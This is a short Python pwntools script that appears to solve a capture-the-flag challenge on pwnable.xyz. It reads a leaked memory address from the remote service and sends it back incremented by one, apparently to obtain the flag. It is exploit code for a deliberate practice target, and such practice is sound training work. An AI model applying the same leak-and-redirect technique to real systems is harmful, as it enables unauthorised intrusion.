#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')

def pwn():

    #io = process('./challenge')
    io = remote("svc.pwnable.xyz", 30000)
    io.recvuntil('Leak:')
    leak_addr = int(io.recv()[0:16], 16)
    info("%#x", leak_addr)

    io.sendline(str(leak_addr + 1))
    io.recv()
    io.sendline('\n')
    print(io.recvall())

if __name__ == '__main__':
    pwn()
